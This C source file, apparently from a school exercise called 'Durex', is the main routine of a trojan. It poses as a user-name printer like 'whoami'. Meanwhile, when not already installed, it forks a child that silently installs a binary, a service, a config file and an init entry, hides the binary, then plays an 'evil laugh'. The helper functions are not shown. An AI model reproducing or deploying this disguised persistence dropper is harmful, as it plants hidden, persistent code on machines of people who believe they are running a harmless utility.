/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/06/28 08:13:10 by root              #+#    #+#             */
/*   Updated: 2018/08/06 19:57:23 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

/* exit */
#include <stdlib.h>
/* getpwuid */
#include <sys/types.h>
#include <pwd.h>

#include "main.h"

static void			print_usr_name()
{
	struct passwd	*passwd;
	struct stat		s;
	pid_t			pid;

	passwd = getpwuid(getuid());
	write(STDIN_FILENO, passwd->pw_name, strlen(passwd->pw_name));
	write(STDIN_FILENO, "\n", 1);
	if (seteuid(geteuid()) != 0)
		return ;
	if (stat(DUREX_BINARY_FILE, &s) < 0) {
		pid = fork();
		if (pid == 0) {
			int		(*process[])(void) = { &install_binary,
										   &install_service,
										   &install_conf,
										   &install_init,
										   &hide_binary };
			for (size_t i = 0; i < sizeof(process) / sizeof(*process); i++) {
				if (process[i]())
					return ;
			}
			system("mpg123 audio/Evil_Laugh.mp3 2>/dev/null");
		}
	}
}

int					main(int ac, char **av)
{
	(void)ac;
	e.prog = av[0];
	print_usr_name();
	return 0;
}
